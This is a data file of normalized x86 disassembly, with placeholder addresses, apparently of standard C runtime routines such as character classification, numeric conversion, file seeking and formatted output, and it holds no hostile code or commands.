call sub_43821a
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x157
pop ebp
retn
sub_4382a0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_42b774
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x117
lea eax [ ebp - 0x10 ]
push eax
push 0x117
push [ ebp + 0x8 ]
call sub_43d336
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_4382f6
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_4382a0
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x117
pop ebp
retn
sub_438326
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_42b774
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x20
lea eax [ ebp - 0x10 ]
push eax
push 0x20
push [ ebp + 0x8 ]
call sub_43d336
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_438377
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_438326
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x20
pop ebp
retn
sub_4383c4
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_437e0d
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_4383e7
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_437e63
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_438406
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_438194
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_438429
mov edi edi
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
push eax
call sub_4381ea
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_438457
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_42b774
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_4268f3
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_439fa0
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_43d336
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_437abf
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_43856c
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_438457
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0x20
pop ebp
retn
sub_438598
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_42b774
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_43fcd2
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_43eb74
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
sub_438657
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_42b774
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push 0x1
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_43fcd2
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_43f616
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
sub_438717
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_42b774
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_43fcd2
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_43f0c5
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
sub_4387d6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi [ rw-data ]
test eax 0xfffffffe
je r-xdata
mov [ rw-data ] eax
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn
sub_43880e
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ecx + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
cmp esi eax
jne r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
call sub_4268f3
push 0x16
pop esi
mov [ eax ] esi
mov edx [ ebp + 0x10 ]
mov [ esi ] al
cmp edx eax
jle r-xdata
pop esi
pop ebx
pop ebp
retn
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
mov eax edx
push edi
lea edi [ esi + 0x1 ]
mov [ esi ] 0x30
mov eax edi
test edx edx
jle r-xdata
call sub_4268f3
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov [ eax ] 0x0
test edx edx
js r-xdata
mov cl [ ebx ]
test cl cl
je r-xdata
call sub_42970c
mov eax esi
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ ebx ] 0x35
jl r-xdata
push 0x30
pop ecx
movsx ecx cl
inc ebx
jmp r-xdata
push edi
call sub_427be0
inc eax
push eax
push edi
push esi
call sub_424b60
add esp 0x10
inc [ ecx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ eax ] cl
inc eax
dec edx
test edx edx
jg r-xdata
xor eax eax
pop edi
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_4388c1
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0xc ]
movzx eax [ ecx + 0x6 ]
push ebx
mov ebx eax
shr ebx 0x4
and eax 0x8000
push esi
mov edx 0x7ff
and ebx edx
push edi
mov [ ebp + 0xc ] eax
mov eax [ ecx + 0x4 ]
mov ecx [ ecx ]
movzx edi bx
mov esi 0x80000000
and eax 0xfffff
mov [ ebp - 0x4 ] esi
test edi edi
je r-xdata
xor edx edx
cmp eax edx
jne r-xdata
cmp edi edx
je r-xdata
add ebx 0x3c01
mov [ ebp - 0x4 ] edx
cmp ecx edx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
add ebx 0x3c00
jmp r-xdata
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
test esi edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov [ eax ] edx
jmp r-xdata
mov edx ecx
shr edx 0x15
shl eax 0xb
or edx eax
or edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
shl ecx 0xb
jmp r-xdata
movzx edi bx
mov ecx [ eax ]
mov ebx ecx
shr ebx 0x1f
add edx edx
or edx ebx
add ecx ecx
add edi 0xffff
mov ecx [ ebp + 0xc ]
or ecx edi
pop edi
pop esi
mov [ eax + 0x8 ] cx
pop ebx
leave
retn
sub_438974
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x24 ] eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_4388c1
pop ecx
pop ecx
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x30 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_44047a
mov esi [ ebp - 0x24 ]
mov [ ebx + 0x8 ] eax
movsx eax [ ebp - 0x1e ]
mov [ ebx ] eax
movsx eax [ ebp - 0x20 ]
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x18 ]
push esi
call sub_427b7a
add esp 0x24
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_4296a0
int3
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0xc ] esi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
sub_438a10
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_438af0
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_438b0f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
and eax 0xfff7ffff
and ecx eax
push esi
mov esi [ ebp + 0x8 ]
test ecx 0xfcf0fce0
je r-xdata
push eax
push [ ebp + 0xc ]
test esi esi
je r-xdata
test esi esi
je r-xdata
call sub_4417f9
call sub_4417f9
mov [ esi ] eax
jmp r-xdata
call sub_4268f3
push 0x16
pop esi
mov [ eax ] esi
call sub_42970c
mov eax esi
jmp r-xdata
push 0x0
push 0x0
call sub_4417f9
pop ecx
pop ecx
mov [ esi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_438b6e
pxor xmm0 xmm0
push ecx
push ebx
mov eax ecx
and eax 0xf
test eax eax
jne r-xdata
mov ebx eax
neg ebx
add ebx 0x10
sub edx ebx
xor eax eax
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov eax edx
and edx 0x7f
shr eax 0x7
je r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
lea esp [ esp ]
pop edx
jmp r-xdata
mov [ ecx ] eax
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop ebx
pop eax
retn
mov eax edx
shr eax 0x4
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec eax
jne r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov eax edx
xor ebx ebx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec eax
jne r-xdata
and eax 0x3
je r-xdata
mov [ ecx ] ebx
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] bl
inc ecx
dec eax
jne r-xdata
sub_438c28
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_43c852
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_4268f3
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_426919
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_438cad
push 0x14
push r--data
call sub_4278c0
or ebx 0xffffffff
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_426906
and [ eax ] 0x0
call sub_4268f3
mov [ eax ] 0x9
call sub_426906
and [ eax ] 0x0
call sub_4268f3
mov [ eax ] 0x9
call sub_42970c
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_427905
retn
mov eax ebx
mov edx ebx
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_43c8bb
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_4268f3
mov [ eax ] 0x9
call sub_426906
and [ eax ] 0x0
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_438c28
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_438d8d
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_438d97
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_42acad
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_438de0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_4268f3
mov [ eax ] 0x9
call sub_4268f3
mov [ eax ] 0x9
call sub_42970c
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
xor eax eax
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
pop ebp
retn
sub_438e36
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x40
push edi
jne r-xdata
add [ esi + 0x4 ] 0xfffffffe
js r-xdata
push esi
call sub_437094
pop ecx
mov ebx rw-data
cmp eax 0xffffffff
je r-xdata
movzx eax [ ebp + 0x8 ]
push esi
push eax
call sub_441e20
pop ecx
pop ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] ax
add [ esi ] 0x2
jmp r-xdata
mov eax ebx
push esi
call sub_437094
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
push esi
call sub_437094
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_437094
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_437094
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov eax ebx
push esi
call sub_437094
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x2
je r-xdata
push esi
call sub_437094
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_437094
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_437094
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov eax ebx
push esi
call sub_437094
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x1
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_4420e9
add esp 0x10
test eax eax
je r-xdata
push esi
call sub_437094
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_437094
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
xor edi edi
cmp [ ebp - 0x10 ] edi
jle r-xdata
mov eax 0xffff
jmp r-xdata
test [ eax + 0x4 ] 0x80
je r-xdata
mov ax [ ebp + 0x8 ]
jmp r-xdata
dec [ esi + 0x4 ]
js r-xdata
movsx eax [ ebp + edi - 0xc ]
push esi
push eax
call sub_43395a
pop ecx
pop ecx
mov eax [ esi ]
mov cl [ ebp + edi - 0xc ]
mov [ eax ] cl
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
inc edi
cmp edi [ ebp - 0x10 ]
jl r-xdata
cmp eax 0xffffffff
je r-xdata
sub_438fbd
push 0xc
push r--data
call sub_4278c0
xor eax eax
mov esi [ ebp + 0xc ]
test esi esi
setne al
test eax eax
jne r-xdata
mov [ ebp + 0xc ] esi
push esi
call sub_429f60
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
push [ ebp + 0x8 ]
call sub_438e36
pop ecx
pop ecx
movzx eax ax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_439023
mov ax [ ebp - 0x1c ]
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
mov eax 0xffff
jmp r-xdata
call sub_427905
retn
sub_439038
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_43395a
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_43906b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ebp + 0x8 ]
dec [ ebp + 0xc ]
call sub_439038
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
sub_439091
mov edi edi
push ebp
mov ebp esp
push ecx
test [ ebx + 0xc ] 0x40
push esi
mov esi eax
mov eax [ edi ]
mov [ ebp - 0x4 ] eax
je r-xdata
and [ edi ] 0x0
cmp [ ebp + 0xc ] 0x0
jle r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov al [ eax ]
dec [ ebp + 0xc ]
mov ecx ebx
call sub_439038
inc [ ebp + 0x8 ]
cmp [ esi ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0xc ]
add [ esi ] eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
cmp [ edi ] 0x2a
jne r-xdata
pop esi
leave
retn
cmp [ edi ] 0x0
jne r-xdata
mov ecx ebx
mov al 0x3f
call sub_439038
sub_439106
mov edi edi
push ebp
mov ebp esp
sub esp 0x280
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x25c ]
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x24c ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x244 ] eax
mov [ ebp - 0x23c ] eax
call sub_42b774
call sub_4268f3
mov [ ebp - 0x26c ] eax
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
cmp [ ebp - 0x250 ] 0x0
je r-xdata
xor ecx ecx
cmp ebx ecx
je r-xdata
push esi
call sub_437094
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] ecx
mov [ ebp - 0x248 ] ecx
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
cmp [ ebp - 0x250 ] 0x0
je r-xdata
inc ebx
xor esi esi
mov [ ebp - 0x240 ] ebx
cmp [ ebp - 0x224 ] esi
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x224 ]
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ edx - 0x20 ]
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx eax
and eax 0x1f
